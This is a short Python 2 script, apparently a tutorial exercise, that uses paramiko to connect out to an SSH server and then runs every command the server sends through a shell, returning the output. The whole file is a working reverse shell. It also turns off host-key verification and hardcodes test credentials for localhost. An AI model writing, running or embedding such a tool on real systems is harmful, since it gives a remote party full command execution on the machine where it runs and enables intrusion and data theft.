import threading
import paramiko
import subprocess

#This function opens an SSH session using IP, username, and password provided in args,
#and runs a single commmand that is also passed in args
#note that this runs the command on the client that is sent from the server.
#This allows the program to be used on a client that is not running SSH server by default (IE Windows)

def ssh_command(ip, user, passwd, command):
    """
    Args:
    ip[1] = IP of ssh server
    user[2] = Username for SSH Server
    passwd[3] = Password for SSH server
    command[4] = Command to be run
    """
    #call ssh client from paramiko lib
    client = paramiko.SSHClient()
    #client.load_host_keys(host_keys_location)
    #set client to automaticaly add host key if missing
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #bind ssh session to variables provided
    client.connect(ip,username=user, password=passwd)
    #open ssh session created by client
    ssh_session = client.get_transport().open_session()
    if ssh_session.active():
        ssh_session.send(command)
        #read the banner from ssh server
        print ssh_session.recv(1024)
        while True:
            #Get command from ssh server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('localhost', 'test123', 'testing', 'ClientConnected')